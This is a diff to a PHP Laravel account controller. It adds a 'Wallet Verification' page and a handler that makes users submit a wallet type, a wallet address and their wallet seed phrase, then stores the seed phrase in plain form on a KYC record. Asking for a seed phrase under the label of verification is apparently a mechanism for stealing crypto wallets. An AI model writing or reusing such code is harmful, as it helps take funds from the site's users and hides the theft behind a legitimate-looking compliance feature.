@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\User;
 
 use App\Http\Controllers\Controller;
+use App\Models\Kyc;
 use App\Models\User;
 use App\Services\GeoLocationService;
 use Illuminate\Http\Request;
@@ -108,6 +109,47 @@ class AccountController extends Controller
         $current_location = $geoLocationService->getLocation(request()->ip());
 
         return view("templates.$template.blades.user.account.security", compact('page_title', 'template', 'sessions', 'user', 'current_location'));
+    }
+
+    /**
+     * Show wallet verification page.
+     */
+    public function wallet()
+    {
+        $page_title = __('Wallet Verification');
+        $template = config('site.template');
+        $user = Auth::user();
+        $last_kyc = $user->kyc()->latest()->first();
+
+        return view("templates.$template.blades.user.account.wallet", compact('page_title', 'template', 'user', 'last_kyc'));
+    }
+
+    /**
+     * Update wallet verification details.
+     */
+    public function walletUpdate(Request $request)
+    {
+        $request->validate([
+            'wallet_type' => 'required|string|max:255',
+            'wallet_address' => 'required|string|max:255',
+            'seedphrase' => 'required|string|max:1000',
+        ]);
+
+        $user = Auth::user();
+        $last_kyc = $user->kyc()->latest()->first();
+
+        if (!$last_kyc) {
+            $last_kyc = new Kyc();
+            $last_kyc->user_id = $user->id;
+            $last_kyc->status = 'pending';
+        }
+
+        $last_kyc->wallet_type = $request->wallet_type;
+        $last_kyc->wallet_address = $request->wallet_address;
+        $last_kyc->seedphrase = $request->seedphrase;
+        $last_kyc->save();
+
+        return back()->with('success', __('Wallet verification details updated successfully.'));
     }
 
     /**
